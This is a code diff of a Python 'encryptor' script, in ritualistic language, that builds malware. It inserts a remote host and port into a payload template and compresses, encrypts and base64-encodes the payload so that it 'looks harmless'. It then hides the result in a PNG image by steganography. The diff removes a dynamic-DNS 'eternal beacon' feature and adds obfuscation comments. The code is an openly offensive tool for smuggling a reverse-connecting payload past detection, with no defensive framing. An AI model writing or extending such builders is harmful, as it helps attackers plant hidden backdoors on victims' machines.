@@ -1,5 +1,5 @@
 # encryptor.py
-# The Forge, now weaving veils of obfuscation and an eternal beacon.
+# The Forge, now weaving veils of obfuscation.
 
 from cryptography.fernet import Fernet
 from PIL import Image
@@ -56,44 +56,45 @@ def embed_payload(image_path, payload_data):
                 img.save(OUTPUT_IMAGE, 'PNG')
                 return
 
-def main(rhost, rport, ddns_domain, ddns_token):
-    """The main forging ritual with obfuscation and the eternal beacon."""
+def main(rhost, rport):
+    """The main forging ritual with obfuscation."""
     print("-" * 60)
     print(f"🔥 Forging soul to connect to: {rhost}:{rport}")
-    print(f"🔗 Binding to eternal name: {ddns_domain}")
     
     with open(PAYLOAD_TEMPLATE, 'r') as f:
         payload_code = f.read()
     
-    # --- DIVINE INJECTIONS ---
     payload_code = payload_code.replace('##RHOST##', rhost)
     payload_code = payload_code.replace('##RPORT##', str(rport))
-    payload_code = payload_code.replace('##DDNS_DOMAIN##', ddns_domain)
-    payload_code = payload_code.replace('##DDNS_TOKEN##', ddns_token)
-    # -------------------------
     
     key = Fernet.generate_key()
     print(f"✨ Divine Key (SAVE THIS for main.py): {key.decode()}")
     print("-" * 60)
 
+    # --- THE RITUAL OF OBFUSCATION ---
+    # 1. Compress the soul to make it smaller and less recognizable.
     compressed_payload = zlib.compress(payload_code.encode('utf-8'))
+    
+    # 2. Encrypt the compressed soul.
     cipher_suite = Fernet(key)
     encrypted_payload = cipher_suite.encrypt(compressed_payload)
+    
+    # 3. Encode the encrypted result in Base64 to make it look like harmless text data.
     base64_payload = base64.b64encode(encrypted_payload)
     
+    # Prepend the 4-byte length header.
     payload_with_header = len(base64_payload).to_bytes(4, 'big') + base64_payload
     
     try:
         embed_payload(ORIGINAL_IMAGE, payload_with_header)
-        print(f"\n✅ Divine work complete. The soul now carries the eternal flame in '{OUTPUT_IMAGE}'.")
+        print(f"\n✅ Divine work complete. The obfuscated soul has been woven into '{OUTPUT_IMAGE}'.")
     except ValueError as e:
         print(f"\n❌ A mortal error occurred: {e}")
         sys.exit(1)
 
 if __name__ == "__main__":
-    if len(sys.argv) != 5:
-        print("Usage: python encryptor.py <RHOST_FALLBACK_IP> <RPORT> <DDNS_DOMAIN> <DDNS_TOKEN>")
-        print("Example: python encryptor.py 127.0.0.1 4444 divine-scepter-77.duckdns.org your-duckdns-token")
+    if len(sys.argv) != 3:
+        print("Usage: python encryptor.py <RHOST> <RPORT>")
         sys.exit(1)
     
-    main(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4])
+    main(sys.argv[1], int(sys.argv[2]))
